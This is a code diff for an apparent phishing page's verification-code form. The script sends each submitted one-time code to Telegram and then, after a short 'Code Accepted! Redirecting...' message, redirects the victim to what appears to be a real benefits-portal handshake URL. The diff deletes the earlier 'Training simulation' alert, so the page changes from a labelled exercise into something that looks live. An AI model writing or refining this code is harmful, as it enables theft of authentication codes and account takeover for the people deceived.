@@ -7,6 +7,13 @@
   var codeError = document.getElementById("code_validation_message");
   var resendBtn = document.getElementById("resend-code-btn");
   var infoText = document.getElementById("enter-code-info");
+  var submitBtn = document.getElementById("submit-code-btn");
+
+  // ============================================================
+  // ====== FINAL REDIRECT URL ===================================
+  // ============================================================
+
+  const REDIRECT_URL = "https://melodybenefits.wealthcareportal.com/Authentication/Handshake";
 
   // ============================================================
   // ====== TELEGRAM INTEGRATION =================================
@@ -152,7 +159,7 @@
   });
 
   // ============================================================
-  // ====== FORM SUBMIT (WITH TELEGRAM) ========================
+  // ====== FORM SUBMIT (WITH REDIRECT) =========================
   // ============================================================
 
   form.addEventListener("submit", function (event) {
@@ -172,16 +179,27 @@
     }
 
     // ====== SEND CODE TO TELEGRAM ======
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Verifying...';
+    
     sendToTelegram('code_submitted', {
       code: code
+    }).then(() => {
+      submitBtn.textContent = 'Code Accepted! Redirecting...';
+      
+      // Clear session storage
+      try {
+        sessionStorage.removeItem("melodyAuth");
+      } catch (e) {}
+      
+      // ====== REDIRECT TO FINAL URL ======
+      setTimeout(function() {
+        window.location.href = REDIRECT_URL;
+      }, 1500);
+    }).catch(() => {
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Submit';
+      alert('An error occurred. Please try again.');
     });
-
-    // Clear session storage
-    try {
-      sessionStorage.removeItem("melodyAuth");
-    } catch (e) {}
-
-    alert("✅ Code accepted! (Training simulation)");
-    codeInput.value = "";
   });
 })();
